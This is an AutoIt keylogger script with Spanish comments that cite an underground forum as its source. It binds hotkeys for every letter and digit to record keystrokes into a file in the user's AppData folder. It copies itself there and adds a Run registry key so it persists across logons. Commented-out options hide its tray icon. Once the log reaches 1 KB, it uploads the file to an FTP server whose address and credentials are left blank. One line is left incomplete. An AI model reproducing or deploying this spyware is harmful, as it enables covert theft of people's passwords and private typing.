#include <FTPEx.au3>
; BUG: Te deshabilita CAPSLOCK / BLOQ MAYUS
; BUG: Al dejar presionado shift solo guarda la primera en mayus
;
;con esto escondemos el icono y no mostramos errores
;AutoItSetOption("RunErrorsFatal", 0)
;AutoItSetOption("TrayIconHide", 1)
;
;Basado en el codigo fente encontrado en https://www.underground.org.mx/?topic=16292.0
Local $sServer = '' ; 
Local $sUsername = ''
Local $sPass = ''
Local $archivo = @AppDataDir&"\slogger.txt"


$file = FileOpen($archivo, 1)
If $file = -1 Then
    MsgBox(0, "Error", "El file no se pudo crear/abrir.")
    Exit
EndIf


if FileExists(@AppDataDir&"\key1685.exe") = 0 Then
   FileCopy(@AutoItExe,@AppDataDir)
   reg()
EndIf


keyLog()

Func keyLog()
	Local $iFileSize = FileGetSize($archivo)

	
	while $iFileSize < 1024
		HotKeySet("!k", "menukey")
		HotKeySet("!q", "quit")
		HotKeySet(" ", "logea")
		HotKeySet("a", "logea")
		HotKeySet("b", "logea")
		HotKeySet("c", "logea")
		HotKeySet("d", "logea")
		HotKeySet("e", "logea")
		HotKeySet("f", "logea")
		HotKeySet("g", "logea")
		HotKeySet("h", "logea")
		HotKeySet("i", "logea")
		HotKeySet("j", "logea")
		HotKeySet("k", "logea")
		HotKeySet("l", "logea")
		HotKeySet("m", "logea")
		HotKeySet("n", "logea")
		HotKeySet("ñ", "logea")
		HotKeySet("o", "logea")
		HotKeySet("p", "logea")
		HotKeySet("q", "logea")
		HotKeySet("r", "logea")
		HotKeySet("s", "logea")
		HotKeySet("t", "logea")
		HotKeySet("u", "logea")
		HotKeySet("v", "logea")
		HotKeySet("w", "logea")
		HotKeySet("x", "logea")
		HotKeySet("y", "logea")
		HotKeySet("z", "logea")
		HotKeySet("A", "logea")
		HotKeySet("B", "logea")
		HotKeySet("C", "logea")
		HotKeySet("D", "logea")
		HotKeySet("E", "logea")
		HotKeySet("F", "logea")
		HotKeySet("G", "logea")
		HotKeySet("H", "logea")
		HotKeySet("I", "logea")
		HotKeySet("J", "logea")
		HotKeySet("K", "logea")
		HotKeySet("L", "logea")
		HotKeySet("M", "logea")
		HotKeySet("N", "logea")
		HotKeySet("Ñ", "logea")
		HotKeySet("O", "logea")
		HotKeySet("P", "logea")
		HotKeySet("Q", "logea")
		HotKeySet("R", "logea")
		HotKeySet("S", "logea")
		HotKeySet("T", "logea")
		HotKeySet("U", "logea")
		HotKeySet("V", "logea")
		HotKeySet("W", "logea")
		HotKeySet("X", "logea")
		HotKeySet("Y", "logea")
		HotKeySet("Z", "logea")
		HotKeySet("0", "logea")
		HotKeySet("1", "logea")
		HotKeySet("2", "logea")
		HotKeySet("3", "logea")
		HotKeySet("4", "logea")
		HotKeySet("5", "logea")
		HotKeySet("6", "logea")
		HotKeySet("7", "logea")
		HotKeySet("8", "logea")
		HotKeySet("9", "logea")
	wend
	mandaFTP()
EndFunc

Func logea()
	HotKeySet(@HotKeyPressed)
	FileWrite($file, @HotKeyPressed)
	Send(@HotKeyPressed) ;aparte de recibir el key lo reenviamos
EndFunc

Func mandaFTP()
	Local $sRemoteFile =
	Local $hOpen = _FTP_Open('MyFTP Control')
	Local $hConn = _FTP_Connect($hOpen, $sServer, $sUsername, $sPass)
	Local $result= _FTP_FilePut($hOpen,$archivo, $sRemoteFile)
	Local $iFtpc = _FTP_Close($hConn)
	Local $iFtpo = _FTP_Close($hOpen)
EndFunc

Func menukey()
	FileClose($file)
	$contenido = FileRead($archivo)
	MsgBox(0,"Keys",$contenido)
	$file = FileOpen($archivo, 1)
EndFunc


Func reg()
	;Local $osVersion=@OSVersion
	
	RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Key1685", "REG_SZ",@AppDataDir&"\key1685")
	keyLog()
	
EndFunc

Func quit()
	FileClose($file)
	FileDelete($archivo)
	Exit 0
EndFunc
